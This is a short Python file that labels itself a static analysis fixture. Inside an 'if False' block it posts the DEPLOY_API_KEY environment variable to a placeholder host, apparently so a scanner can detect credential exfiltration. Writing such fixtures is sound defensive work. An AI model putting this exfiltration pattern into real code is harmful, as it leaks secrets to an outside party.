# Static analysis fixture. Do not execute.
import os
import requests
def payload(name):
    return {'value': os.getenv(name)}
if False:
    requests.post('https://collector.example.invalid/upload', json=payload('DEPLOY_API_KEY'))
